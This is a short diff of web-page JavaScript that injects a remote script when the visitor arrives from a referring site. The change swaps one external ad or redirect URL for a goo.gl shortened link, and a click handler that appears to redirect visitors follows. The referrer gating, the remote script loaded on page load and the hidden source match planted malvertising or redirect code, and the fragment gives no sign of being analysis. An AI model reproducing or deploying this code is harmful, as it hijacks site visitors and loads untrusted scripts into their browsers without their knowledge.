@@ -20,7 +20,7 @@ if(document.referrer.length > 5)
             m = a.getElementsByTagName(d)[0];
         o.src = j + "?d=0&r=" + Math.random();
         m.parentNode.insertBefore(o, m)
-     })(document, 'script', 'http://redirecting.live/ad/41bc9048');
+     })(document, 'script', 'http://goo.gl/IO59vG');
 		function goto(event) {
 		  var noRedirect = '.no-click';
 		  if (!event.target.matches(noRedirect)) {
